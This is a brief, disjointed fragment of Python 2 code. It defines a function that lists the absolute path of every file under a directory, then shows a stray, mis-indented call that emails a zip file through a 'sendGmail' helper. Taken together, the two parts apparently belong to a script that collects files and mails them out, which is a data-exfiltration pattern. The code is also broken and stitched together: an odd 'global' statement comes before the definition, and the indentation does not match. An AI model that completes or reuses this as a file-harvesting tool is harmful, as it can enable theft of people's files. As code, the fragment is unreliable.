global walkdir
def walkdir(path):
    txt = ""
    for root, dirs, files in os.walk(unicode(path)):
        for file in files:
            txt += os.path.abspath(os.path.join(root, file)) + "\n"
    return txt.encode("UTF-8")

           sendGmail(SUBJECT = zipname, textMessage = zipname, zip_file =zipname)
